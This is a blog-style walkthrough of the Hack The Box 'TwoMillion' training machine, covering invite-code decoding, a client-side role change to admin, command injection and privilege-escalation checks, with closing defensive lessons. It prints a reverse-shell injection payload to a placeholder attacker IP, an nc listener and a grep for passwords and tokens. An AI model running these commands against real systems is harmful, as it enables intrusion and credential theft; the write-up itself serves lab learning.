---
layout: post
title: "Hack The Box: TwoMillion (Easy) — My Experience"
date: 2025-10-15 12:00:00 -0500
categories: [CTF, HackTheBox]
tags: [htb, twomillion, ctf, walkthrough, enumeration, privilege-escalation]
pin: false
---

# Hack The Box: TwoMillion (Easy)

I picked up TwoMillion after a long week because I wanted something that felt fun, fast, and a little nostalgic. It’s one of those HTB boxes that rewards curiosity more than heavy tooling—perfect for a quick win and a reminder that reading what’s right in front of you is often enough.

> Legal note: This is about my experience on a legal training lab.

## First Impressions
I did a quick scan and headed straight to the website. The UI felt familiar—HTB throwback style—with an invite flow that immediately made me think: “There’s probably something helpful hiding in the client code.” That hunch paid off. No brute forcing.

What I enjoyed here was the reminder that client-side JavaScript can be a treasure map. Reading it felt like walking behind the scenes and finding the door that everyone assumes is locked.

```bash
# Quick scan
export TARGET=<IP>
nmap -p- -sC -sV -oN nmap_full $TARGET

# Peek at the client JS to discover invite endpoints
curl -s http://$TARGET/js/inviteapi.min.js | sed 's/;/;\n/g' | head -n 60

# Generate and decode the invite
curl -s "http://$TARGET/api/invite/generate" | jq -r '.data' | tee invite.b64
cat invite.b64 | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | tee invite.txt
```

## The Little Nudge That Opened The Door
Once I registered and poked around, I watched the network calls and noticed how roles were being handled. It was one of those “surely this is checked server‑side… right?” moments. It wasn’t. A tiny change and—boom—an Admin panel appeared. That mix of surprise and “I knew it” is the best part of these easier machines.

```bash
# Conceptual example: promoting my role after login
curl -i -X POST "http://$TARGET/api/user/role" \
  -H "Cookie: <your-session-cookie>" \
  -H "Content-Type: application/json" \
  --data '{"role":"admin"}'
```

## Getting a Shell (And Keeping It)
The admin “network tool” practically built shell commands for me. It’s the classic trap: convenience over safety. A quick injection later I had a shell. I stabilized it out of habit and did my usual sweep—users, services, config paths. Nothing dramatic, just tidy and methodical.

```bash
# Listener
rlwrap nc -lvnp 4444

# Injection payload (Linux bash)
;bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'

# Stabilize and quick triage
script /dev/null -c bash
stty raw -echo; fg
export TERM=xterm-256color
id; whoami; hostname; ip a
ls -al /home; cat /etc/os-release
```

## PrivEsc Thoughts
For escalation I kept it simple: check sudo, peek at SUIDs, and read through the web app’s files for secrets. Depending on the kernel build, there are well‑known locals that might apply—but I don’t fire those unless I need to. In my run, good hygiene and a bit of config snooping were enough to finish.

```bash
# Quick checks I ran
sudo -l || true
find / -perm -4000 -type f 2>/dev/null
grep -R "PASSWORD\|SECRET\|TOKEN" -n /var/www 2>/dev/null
ls -al /opt /srv /var/backups

# If containers are present
docker ps -a || true
getent group docker || true
```

## Flags
- User flag: Collected after the foothold.
- Root/Admin flag: Wrapped up after escalation.

## If This Were My App
- I’d treat invite flows like auth: rate‑limit, validate, and never rely on clever encoding.
- Role changes must be enforced server‑side. The client can request, but the server decides.
- Admin utilities should never wrap raw shell; whitelist flags or use safe libraries.
- Secrets belong outside the web root with strict permissions.
- Ship patches regularly; locals shouldn’t be one‑command escalations.

## What Stuck With Me
- Reading client JS first saved time—it literally pointed me to the right door.
- Security isn’t about obscurity or “nice UI”; it’s about boring, consistent validation.
- The fastest path is often the cleanest one: be curious, read the code, then move.


